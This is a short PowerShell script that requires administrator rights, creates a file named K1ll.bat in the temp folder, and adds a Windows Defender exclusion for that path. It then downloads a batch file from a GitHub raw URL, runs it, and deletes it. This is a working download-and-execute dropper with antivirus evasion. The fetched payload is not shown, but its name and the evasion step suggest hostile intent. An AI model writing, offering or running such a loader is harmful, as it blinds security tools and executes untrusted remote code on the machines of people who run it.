Clear-Host
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Error "Run as administrator!"
    exit 1
}
 
$batPath = "$env:TEMP\K1ll.bat"
New-Item -Path $batPath -ItemType File -Force | Out-Null
 
Add-MpPreference -ExclusionPath $batPath  -ErrorAction SilentlyContinue | Out-Null
 
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/al0nks1337/al0nks1337.github.io/refs/heads/main/K1ll.bat" -OutFile $batPath
Start-Process -FilePath $batPath -Wait | Out-Null
Remove-Item -Path $batPath -Force -ErrorAction SilentlyContinue
Exit
